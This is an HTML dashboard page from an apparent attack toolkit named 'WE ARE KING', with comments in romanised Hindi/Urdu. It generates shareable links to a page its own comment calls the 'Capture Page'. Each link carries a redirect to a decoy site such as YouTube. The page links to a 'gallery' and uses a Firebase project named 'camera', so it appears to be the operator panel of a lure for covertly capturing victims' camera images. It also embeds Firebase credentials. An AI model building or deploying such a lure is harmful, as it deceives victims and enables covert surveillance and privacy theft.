<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - WE ARE KING Toolkit</title>
    <!-- Page ko hide rakhen jab tak login check na ho jaye -->
    <style>
        body { 
            display: none; 
            background: #0f172a; 
            color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .main-card {
            background: #1e293b;
            max-width: 500px;
            margin: 50px auto;
            padding: 30px;
            border-radius: 20px;
            border: 1px solid #00d2ff;
            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
        }
        input {
            width: 90%;
            padding: 12px;
            margin: 15px 0;
            border-radius: 8px;
            border: 1px solid #334155;
            background: #0f172a;
            color: #00d2ff;
        }
        .btn-gen {
            background: #00d2ff;
            color: #000;
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-gen:hover { background: #00a8cc; }
        #resultBox {
            margin-top: 25px;
            padding: 15px;
            background: rgba(0,0,0,0.3);
            border: 1px dashed #00d2ff;
            display: none;
            word-break: break-all;
        }
        .nav-btn {
            background: #22c55e;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            margin: 10px;
            display: inline-block;
        }
    </style>
</head>
<body>

    <div class="main-card">
        <img src="https://files.catbox.moe/k3v3k6.png" width="60" alt="Logo">
        <h2>KING LINK GENERATOR</h2>
        <p style="color: #94a3b8; font-size: 14px;">Enter the target URL where you want to redirect the user.</p>

        <!-- Input for Redirect URL -->
        <input type="text" id="targetUrl" placeholder="Example: https://youtube.com">
        
        <button class="btn-gen" onclick="generateMagicLink()">GENERATE LINK</button>

        <!-- Link Result Display -->
        <div id="resultBox">
            <p style="font-size: 13px; color: #94a3b8;">Share this link:</p>
            <p id="finalLink" style="color: #00d2ff; font-weight: bold;"></p>
            <button onclick="copyToClipboard()" style="background: #334155; color: white; border: none; padding: 5px 10px; cursor: pointer;">COPY</button>
        </div>
    </div>

    <div style="margin-top: 20px;">
        <a href="gallery.html" class="nav-btn">VIEW GALLERY</a>
        <button onclick="logoutUser()" style="background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">LOGOUT</button>
    </div>

    <!-- Firebase Scripts -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDyl_AUPvulQJtVPBEeofS0OaWADyO4acw",
            authDomain: "camera-fc58f.firebaseapp.com",
            databaseURL: "https://camera-fc58f-default-rtdb.firebaseio.com",
            projectId: "camera-fc58f",
            storageBucket: "camera-fc58f.firebasestorage.app",
            appId: "1:1018467164860:web:b65a217d47affa6e7226b9"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);

        // --- AUTH GUARD: Login Check ---
        onAuthStateChanged(auth, (user) => {
            if (user) {
                // Agar user login hai, toh body dikha do
                document.body.style.display = "block";
                console.log("Logged in as:", user.email);
            } else {
                // Agar login nahi hai, toh index.html par redirect kar do
                window.location.href = "index.html";
            }
        });

        // Link Generate Function
        window.generateMagicLink = function() {
            const redirect = document.getElementById('targetUrl').value || 'https://youtube.com';
            const domain = window.location.origin;
            
            // Ye ch.html (Capture Page) ka link banayega
            const finalUrl = `${domain}/ch.html?redirect=${encodeURIComponent(redirect)}`;
            
            document.getElementById('finalLink').innerText = finalUrl;
            document.getElementById('resultBox').style.display = 'block';
        };

        // Copy Function
        window.copyToClipboard = function() {
            const linkText = document.getElementById('finalLink').innerText;
            navigator.clipboard.writeText(linkText);
            alert("Link Copied!");
        };

        // Logout Function
        window.logoutUser = function() {
            signOut(auth).then(() => {
                window.location.href = "index.html";
            });
        };
    </script>
</body>
</html>
